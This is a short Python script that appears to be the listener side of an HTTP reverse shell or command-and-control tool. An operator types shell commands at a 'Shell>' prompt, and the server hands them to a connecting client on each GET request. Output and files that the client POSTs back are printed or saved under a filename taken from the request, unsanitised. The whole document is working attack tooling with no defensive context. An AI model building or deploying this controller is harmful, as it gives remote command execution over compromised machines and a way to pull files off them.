#!/usr/bin/env python
import http.server as http_server
import re
#Python 3
#HTTP server

HOSTNAME = "192.168.0.200"
PORT_NUMBER = 8080
CONFIG = (HOSTNAME, PORT_NUMBER)

class MyHandler(http_server.BaseHTTPRequestHandler):

    def do_GET(self):
        command = check_input()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-length'])
        _post = self.rfile.read(length)
        response = _post.decode()
        print(response)
        if "filename=" in response:
            filename = extract_filename(response)
            with open(filename, 'w') as f:
                f.write(response)

def extract_filename(text):
    matches = re.split('\r\n', text)
    match = re.search("(filename=\"\w.*)$" , matches[1])
    attr, filename, _ = match[0].split('"')
    return filename

def check_input():
    command = input("Shell> ")
    if len(command) > 0:
        return command
    else:
        return 'ls -lA'

if __name__ == '__main__':
    try:
        server = http_server.HTTPServer(CONFIG, MyHandler)
        print("Server is running on port {}".format(PORT_NUMBER))
        server.serve_forever()
    except KeyboardInterrupt:
        print('[+] Server is terminated')
        server.server_close()
